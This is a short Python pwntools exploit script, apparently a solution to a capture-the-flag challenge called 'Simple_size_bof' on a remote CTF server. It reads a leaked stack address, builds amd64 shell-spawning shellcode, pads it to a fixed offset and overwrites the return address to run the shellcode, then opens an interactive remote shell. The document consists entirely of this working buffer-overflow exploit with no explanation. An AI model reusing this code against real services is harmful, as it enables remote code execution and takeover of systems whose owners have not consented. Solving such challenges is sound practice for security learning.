from pwn import *

#context.log_level = 'DEBUG'
context.arch = 'amd64'
e = ELF("./Simple_size_bof")
#p = process("./Simple_size_bof")
r = remote("ctf.j0n9hyun.xyz", 3005)

shell = shellcraft.amd64.linux.sh()
print r.recvuntil("buf: 0x"),
buffer = r.recv(12)
print buffer
offset = 0x6d30 + 8
print "shellcode size : ",len(asm(shell))

payload = ''
payload += asm(shell)
payload += "A"*(offset-len(asm(shell)))
payload += p64(int(buffer, 16))

r.sendline(payload)
r.interactive()
